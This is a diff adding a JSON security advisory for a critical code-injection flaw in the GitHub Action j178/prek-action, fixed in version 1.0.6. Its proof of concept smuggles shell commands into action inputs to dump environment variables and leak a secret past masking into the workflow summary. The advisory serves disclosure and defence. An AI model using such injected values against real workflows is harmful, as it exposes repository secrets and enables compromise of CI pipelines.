@@ -1,0 +1,63 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.0.5",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-pwf7-47c3-mfhx/GHSA-pwf7-47c3-mfhx.json"
+      },
+      "package": {
+        "ecosystem": "GitHub Actions",
+        "name": "j178/prek-action"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.6"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": []
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-09-29T17:51:19Z",
+    "nvd_published_at": null,
+    "severity": "CRITICAL"
+  },
+  "details": "### Summary\nThere are three potential attacks of arbitrary code injection vulnerability in the composite action at _action.yml_.\n\n### Details\nThe GitHub Action variables `inputs.prek-version`, `inputs.extra_args`, and `inputs.extra-args` can be used to execute arbitrary code in the context of the action.\n\n### PoC\n```yaml\n- uses: j178/prek-action@v1.0.5\n  with:\n    prek-version: $(printenv >> $GITHUB_STEP_SUMMARY && echo \"0.2.2\")\n    extra_args: '&& echo \"MY_SECRET with a character is: ${MY_SECRET:0:1}a${MY_SECRET:1}\" >> $GITHUB_STEP_SUMMARY && echo \"\"'\n  env:\n    MY_SECRET: ${{ secrets.MY_SECRET }}\n```\n\nThe previous example will print all the environment variables, and it will expose `MY_SECRET` environment variable value to the summary of the workflow. An attacker could potentially use this vector to compromise the security of the target repository, even passing unnotice because the action will run normally.\n\n### Impact\nCritical, CWE-94",
+  "id": "GHSA-pwf7-47c3-mfhx",
+  "modified": "2025-09-29T17:51:19Z",
+  "published": "2025-09-29T17:51:19Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/j178/prek-action/security/advisories/GHSA-pwf7-47c3-mfhx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/j178/prek-action/commit/6b7c6ef5c3875c766893b881b40773cd5605bde3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/j178/prek-action"
+    }
+  ],
+  "schema_version": "1.7.3",
+  "severity": [
+    {
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "type": "CVSS_V3"
+    }
+  ],
+  "summary": "j178/prek-action vulnerable to arbitrary code injection in composite action"
+}
